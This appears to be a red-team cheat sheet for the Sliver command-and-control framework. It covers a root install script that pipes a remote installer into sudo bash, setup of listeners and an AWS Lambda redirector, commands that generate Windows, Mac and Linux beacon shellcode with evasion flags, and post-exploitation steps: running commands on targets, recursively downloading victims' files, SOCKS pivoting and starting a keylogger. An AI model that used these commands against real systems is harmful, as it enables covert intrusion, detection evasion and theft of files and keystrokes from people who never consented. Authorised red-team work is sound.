https://github.com/sliverarmory
## Sliver Server
```bash
#!/bin/bash

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Not running as root"
    exit
fi

# Stop apache if its started automatically
service apache2 stop

cd /tmp
apt update -y
apt update --fix-missing -y
apt install git mingw-w64 net-tools -y

# Sliver install in Daemon mode
curl https://sliver.sh/install|sudo bash
systemctl status sliver --no-pager
echo Sliver running in Daemon mode!

# Create new user config
cd /root
IP=`curl https://ifconfig.me/ip`
./sliver-server operator --name g1gs --lhost "$IP" --save /root/g1gs.cfg
exit
```

## Sliver Client
```bash
./sliver-client import ./g1gs.cfg    # Import config
./sliver-client                             # Connect to Sliver server

Connecting to <IP ADDRESS>:31337 ...
[*] Loaded 69 extension(s) from disk

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain undying
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type 'help' for options

sliver > help
...
```

## Usage
```bash
# Starting HTTP/S Listeners
http # Start HTTP listener
https # Start HTTPS listener

# Managing or stopping listeners
jobs # View active jobs (aka listeners/stages)
jobs -k <number> # Kill listener job

# Beacon/Session management
beacons # List active beacons
sessions # List active sessions
beacons rm # Select a beacon to remove
use <ID> # Interact with a Beacon/Session
background # Background an active Beacon/Session

# Payloads
implants # List all created payload builds
implants rm <NAME> # Remove an implant build
generate -h ... # Create Session payload
generate beacon -h ... # Create Beacon payload

# Armory (BOFs)
armory # List all available packages/bundles in armory
armory search <query> # Search for specific aromory package/bundle
armory install <name> # Install a new armory package/bundle
armory update # Update installed packages

# Miscellaneous
hosts # List all hosts that have had beacons or sessions
update # Check for Sliver updates
clear # Clear the screen
loot # Show captured loot
reaction ... # Create automatic command upon specific events like a new session
```

## Listeners
```bash
# Start HTTP listener accepting connections from specific domain (i.e. redirector)
http -d redirector-domain.com

# Start HTTPS listener using built-in letsencrypt features (not recommended for red teams)
https -d redirector-domain.com --lets-encrypt

# Start HTTPS listener using a cert/key which only accepts connections from a specific domain, persistent across restarts
https -c cert.pen -k key_decrypted.pem -d redirector-domain.com -p

# Start an mTLS listener accepting all connections
mtls

```

## Redirectors
One easy redirector to setup is AWS lambda from this [blog post here](https://thegreycorner.com/2023/08/30/aws-service-C2-forwarding.html#:~:text=as%20Code%20format.-,Function,-URL%20to%20Lambda) from The Grey Corner. Its easy to setup an AWS Lambda function pointing to your C2 server domain/IP address and use the function URL as your redirector URL when creating shellcode. Additionally, you could create an API Gateway to point to your Lambda function and then use the API Gateway as your redirector URL.

## Payloads
```bash
# Create Windows Beacon HTTPS shellcode with evasion features
generate beacon --http https:/sliver-redirector.com --save /output/path/sliver-shellcode64.bin --seconds 60 --os windows --format shellcode --evasion

# Create Mac Beacon mTLS executable and skip all evasion features for testing purposes
generate beacon --http https:/sliver-redirector.com --save /output/path/sliver-shellcode64.bin --seconds 15 --os mac --skip-symbols --disable-sgn

# Create Windows HTTPS session shellcode with evasion features
generate --http https:/sliver-redirector.com --save /output/path/sliver-shellcode64.bin --seconds 60 --os windows --format shellcode --evasion

# Create Linux mTLS session executable  
generate --mtls https:/sliver-redirector.com --save /output/path/ --os linux
```

## Post-Exploitation
```bash
info --> List info of current implant
getpid --> List current process PID
whoami --> List current user

# Execute commands on system
execute somecommand args1 args2

# Reconfiguring sleep/jitter time
reconfig -i 10s -j 25s

# Files
ls /home/kali --> LS, accepts wildcards
ls C:\\temp\\ --> LS, accepts wildcards
cat /path/to/read/file.txt --> Cat a file
mkdir C:\\temp\\payloads --> Make new directory

# Processes
ps --> List processes
ps -o admin --> Filter processes based on owner
ps -p <PID> --> Filter process based on PID

netstat --> List network connections
ifconfig --> List IP addresses

# Upload/download
upload C:\path\to\file.exe C:\\users\\admin\\downloads\\file.exe --> Upload file to target
download C:\\windows\\temp\\file.txt --> Download file to current local directory
download C:\\windows\\temp\\file.txt C:\path\to\save\file.txt --> Download file to specific local path
download C:\\users\admin\\downloads\\ -r --> Recursively download all files to current local directory

# SOCKS
socks5 start
socks5 stop

# View tasked commands
tasks
tasks fetch <ID> # fetch output from past task
```

## Beacon Object Files (BOF) [Sliver Armory](https://github.com/sliverarmory)
```bash
# List available packages
armory

# Updating Armory
armory update

# Installations
armory install all --> Installing everything
armory install rubeus --> Install just Rubeus
armory install situational-awareness --> Install Situational Awareness package
armory search sa --> Search for Situational Awareness BOFs

# Custom BOFs
raw_keylogger 1  # Start keylogger
raw_keylogger 2  # Get keylogged contents in Sliver
raw_keylogger 0  # Stop keylogger
```

[Modifying C2 Traffic](https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2#modifying-c2-traffic)